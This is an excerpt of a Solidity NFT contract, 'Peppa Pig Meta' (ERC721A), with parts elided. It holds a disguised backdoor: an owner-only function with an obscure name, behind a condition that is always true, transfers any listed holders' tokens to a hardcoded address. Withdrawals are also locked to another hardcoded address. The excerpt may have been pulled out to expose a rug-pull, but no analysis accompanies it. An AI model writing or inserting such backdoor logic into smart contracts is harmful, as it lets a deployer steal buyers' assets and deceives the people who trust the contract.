...
contract Peppa_Pig_Meta is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Peppa Pig Meta", "PPM", maxBatchSize_, collectionSize_) {
  ...
  function PPM_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0xAd1f0F58c017cf5f9D8aD2710e9F2b48D174cd47, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x7778A8C9238b21e455187C63400F408Fc04C4b22);
